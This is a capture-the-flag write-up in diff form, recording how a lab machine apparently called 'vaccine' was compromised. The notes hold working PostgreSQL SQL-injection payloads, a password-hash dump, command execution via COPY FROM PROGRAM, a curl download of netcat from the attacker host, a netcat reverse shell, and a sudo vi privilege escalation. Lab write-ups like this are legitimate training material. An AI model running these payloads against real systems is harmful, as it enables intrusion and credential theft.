@@ -1,0 +1,73 @@
+# getting shell
+* basic enum - ports 21,22,80
+* anonymous connection to FTP got backup.zip. password protected.
+* cracked with hydra - 741852963
+* index.php got md5 password of admin. cracked with crackstation - qwerty789
+* SQLI in search of dashboard.php (don't know if it will do any help). it is stacked though:
+ '; select * from cars;--
+* gobuster didnt find anything of value
+* tried querying version and it looks like PostgreSQL
+
+## cool awesome SQL stuff
+    * got the version with UNION!
+        a' UNION SELECT 1,version(),version(),version(),version() ;--
+        ** PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008, 64-bit
+    * got db user password hash:
+        ** a' UNION SELECT 1, usename, passwd, version(), version() FROM pg_shadow;--
+
+        postgres    md52d58e0637ec1e94cdfba3d1c26b67d01
+    * I am superuser:
+        ** a' UNION SELECT 1, usename, version(), version(), version() FROM pg_user WHERE usesuper IS TRUE;--
+    * DB name is carsdb
+        a' UNION SELECT 1, current_database(), version(), version(), version();--
+    * all tables in carsDB
+        a' UNION SELECT 1, table_catalog, table_schema, table_name, version() FROM information_schema.tables;--
+    * all DBs
+        a' UNION SELECT 1, datname, datname, datname, datname FROM pg_database;--
+    * list files in dir
+        a' UNION SELECT 1, version(), version(), version(), pg_ls_dir('/var/www');--
+
+    * readfile (user flag for example):
+        a' UNION SELECT 1, version(), version(), version(), pg_read_file('../../user.txt', 0, 200);--
+    * writefile test (seems like cant write to www though..)
+        a';CREATE TABLE pentestlab (t TEXT); --
+        a'; INSERT INTO pentestlab(t) VALUES('nc -lvvp 2212 -e /bin/bash'); --
+        a' UNION SELECT 1,t, version(), version(), version() FROM pentestlab; --
+        a'; COPY pentestlab(t) TO '/tmp/pentestlab'; --
+        a' UNION SELECT 1, version(), version(), version(), pg_read_file('/tmp/pentestlab', 0, 200);--
+
+## finally - shell!
+* can run code with this (CVE-2019–9193):
+    a'; DROP TABLE IF EXISTS cmd_exec; -- 
+    a'; CREATE TABLE cmd_exec(cmd_output text); -- 
+    a'; COPY cmd_exec FROM PROGRAM '<command>'; -- 
+    a' UNION SELECT 1, cmd_output, cmd_output, cmd_output, cmd_output FROM cmd_exec; --
+    a'; DROP TABLE IF EXISTS cmd_exec; --
+
+* first tried NC, but it didnt work (error code 2)
+    a'; COPY cmd_exec FROM PROGRAM 'nc 10.10.14.99 2212 -e bash'; -- 
+* without -e it did connect though..
+    a'; COPY cmd_exec FROM PROGRAM 'nc 10.10.14.99 2212 -e bash'; -- 
+* adding 2>&1 to see the error...
+    a'; COPY cmd_exec FROM PROGRAM 'nc 10.10.14.99 2212 -e bash 2>&1'; -- 
+     ERROR: extra data after last expected column CONTEXT: COPY cmd_exec, line 3: " [-m minttl] [-O length] [-P proxy_username] [-p source_port]"
+    so it looks like stupid nc without -e flag
+* curl nc from my machine:
+    sudo python3 -m http.server 80
+    a'; COPY cmd_exec FROM PROGRAM 'curl http://10.10.14.99/nc -o nc'; -- 
+    a'; COPY cmd_exec FROM PROGRAM 'chmod +x nc'; -- 
+* And... we got a shell!
+    b'; COPY cmd_exec FROM PROGRAM './nc 10.10.14.99 2212 -e /bin/bash 2>&1'; -- 
+
+# PE
+* found posgress password in the dashboard.php file:
+    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+* sudo -l shows this:
+    User postgres may run the following commands on vaccine:
+        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+* run this command with sudo and execure shell in vi
+
+
+# FLAGS
+user - ec9b13ca4d6229cd5cc1e09980965bf7
+root - dd6e058e814260bc70e9bbdef2715849
